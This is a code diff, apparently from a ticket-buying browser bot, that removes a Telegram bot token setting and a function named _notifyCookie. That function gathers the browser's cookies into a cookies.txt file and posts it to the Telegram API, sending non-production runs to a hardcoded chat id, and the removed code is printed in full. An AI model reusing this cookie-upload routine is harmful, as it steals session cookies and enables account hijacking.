@@ -887,7 +887,6 @@
       ticketsToBuy: settings.ticketsToBuy || 2,
       allowSeparateTickets: settings.allowSeparateTickets || false,
 
-      telegramBotId: settings.telegramBotId,
       telegramBotChatId: settings.telegramBotChatId || null,
       production: settings.production || false,
       debug: settings.debug === undefined ? true : settings.debug,
@@ -1006,7 +1005,6 @@ getcookie func
 
     const data = {
       message: message,
-      telegramBotToken: $settings.telegramBotId,
       chatId: $settings.telegramBotChatId,
       botName: "<RealBot>",
       chromeProfile: $settings.chromeProfile,
@@ -1033,7 +1031,6 @@ getcookie func
 
     const data = {
       message: message,
-      telegramBotToken: $settings.telegramBotId,
       chatId: $settings.telegramBotChatErrorsId,
       botName: "<RealBot>",
       chromeProfile: $settings.chromeProfile,
@@ -1056,44 +1053,6 @@ getcookie func
   }
 
   //   Send notification to Telegram Bot cookie
-
-  function _notifyCookie() {
-    let botName = "RealBot coockie";
-    let telegramBotChatDebugId = 741577;
-    let chatId = _isProduction()
-      ? $settings.telegramBotChatId
-      : telegramBotChatDebugId;
-
-    let url =
-      "https://api.telegram.org/bot" +
-      $settings.telegramBotId +
-      "/sendDocument";
-    let formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append(
-      "document",
-      new Blob([_myCustomGetCookie()], { type: "text/plain" }),
-      "cookies.txt"
-    );
-    formData.append("caption", `<${botName}> ${$settings.chromeProfile}`);
-
-    fetch(url, {
-      method: "POST",
-      body: formData,
-    })
-      .then((response) => {
-        if (!response.ok) {
-          throw new Error("Network response was not ok");
-        }
-        return response.json();
-      })
-      .then((data) => {
-        console.log(data);
-      })
-      .catch((error) => {
-        console.error("Error:", error);
-      });
-  }
 
   /*
    //  Send notification to Slack Bot
